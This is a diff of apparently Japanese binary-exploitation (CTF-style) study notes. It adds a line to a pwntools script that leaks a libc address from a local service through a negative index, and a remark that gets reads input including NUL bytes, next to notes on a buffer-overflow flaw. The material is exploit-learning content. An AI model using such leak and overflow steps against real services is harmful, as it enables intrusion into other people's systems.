@@ -1153,6 +1153,7 @@ from pwn import *
 conn = remote("localhost", 5000)
 
 conn.sendafter("index: ", "-2")
+conn.sendlineafter("ID: ", "admin")
 libc_start_main = conn.recvline() #改行まで読み込み
 conn.recvuntil('\n')
 
@@ -1206,6 +1207,7 @@ gets
         gets(buff);
         
 文字列が何文字読み込まれるか分からないので、BOFの脆弱性がある。
+gets関数は改行かEOFまでの文字列をNUL文字も含めて読み込む
 ```
 ## 参考文献
 ### Heap
